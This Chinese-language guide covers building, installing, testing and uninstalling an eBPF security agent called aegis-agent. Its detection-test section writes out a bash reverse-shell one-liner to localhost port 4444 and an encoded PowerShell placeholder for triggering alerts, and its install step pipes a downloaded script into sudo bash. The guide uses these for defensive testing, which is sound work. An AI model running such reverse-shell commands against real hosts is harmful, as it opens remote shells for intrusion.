# Agent 安装测试指南

## 构建流程

### 1. 编译 Agent

```bash
cd agent
make all
```

此命令会：
- 编译 eBPF 程序 (`.bpf.o` 文件)
- 交叉编译 Go 二进制 (linux/amd64, linux/arm64)
- 打包二进制和 eBPF 文件到 `dist/aegis-agent.tar.gz`

### 2. 上传到 MinIO

```bash
make upload
```

或者手动上传：

```bash
# 配置 mc 客户端
mc alias set myminio http://localhost:9000 minioadmin minioadmin

# 上传
mc cp dist/aegis-agent.tar.gz myminio/agent-artifacts/
```

## 安装流程

### 1. 删除本机已有 Agent

```bash
# 停止服务
sudo systemctl stop aegis-agent

# 禁用服务
sudo systemctl disable aegis-agent

# 删除文件
sudo rm -rf /opt/aegis-agent
sudo rm -rf /etc/aegis-agent
sudo rm -f /etc/systemd/system/aegis-agent.service

# 重载 systemd
sudo systemctl daemon-reload
```

### 2. 获取安装命令

访问系统配置页面，复制安装命令，格式如下：

```bash
curl -sSL http://<SERVER_IP>:8080/api/v1/agent/install.sh | sudo bash
```

### 3. 执行安装

在目标服务器上执行安装命令：

```bash
curl -sSL http://192.168.1.100:8080/api/v1/agent/install.sh | sudo bash
```

### 4. 验证安装

```bash
# 检查服务状态
sudo systemctl status aegis-agent

# 查看日志
sudo journalctl -u aegis-agent -f

# 检查进程
ps aux | grep aegis-agent
```

## 测试流程

### 完整测试流程

```bash
# 1. 进入 agent 目录
cd agent

# 2. 编译打包
make all

# 3. 上传到 MinIO
make upload

# 4. 删除本机 agent
sudo systemctl stop aegis-agent
sudo rm -rf /opt/aegis-agent /etc/aegis-agent
sudo systemctl daemon-reload

# 5. 重新安装 (从页面获取命令)
curl -sSL http://localhost:8080/api/v1/agent/install.sh | sudo bash

# 6. 验证
sudo systemctl status aegis-agent
```

### 测试检测功能

安装完成后，可以触发一些检测规则测试：

```bash
# 测试反向 Shell 检测 (T1059.004)
bash -i >& /dev/tcp/127.0.0.1/4444 0>&1

# 测试 PowerShell 检测 (T1059.001) - 如果有 PowerShell
powershell -enc <base64_command>

# 查看 Alerts 页面确认告警生成
```

## 故障排查

### Agent 无法连接

1. 检查网络连通性
```bash
ping <SERVER_IP>
telnet <SERVER_IP> 9090
```

2. 检查 gRPC 端口
```bash
netstat -tlnp | grep 9090
```

3. 检查 Agent 日志
```bash
sudo journalctl -u aegis-agent -n 100
```

### eBPF 加载失败

1. 检查内核版本 (需要 4.18+)
```bash
uname -r
```

2. 检查 BTF 支持
```bash
ls /sys/kernel/btf/
```

3. 检查权限
```bash
# Agent 需要 root 或 CAP_BPF 权限
sudo systemctl status aegis-agent
```

## 卸载

```bash
# 使用本地卸载脚本
sudo /opt/aegis-agent/uninstall.sh

# 或手动卸载
sudo systemctl stop aegis-agent
sudo systemctl disable aegis-agent
sudo rm -rf /opt/aegis-agent /etc/aegis-agent
sudo rm -f /etc/systemd/system/aegis-agent.service
sudo systemctl daemon-reload
```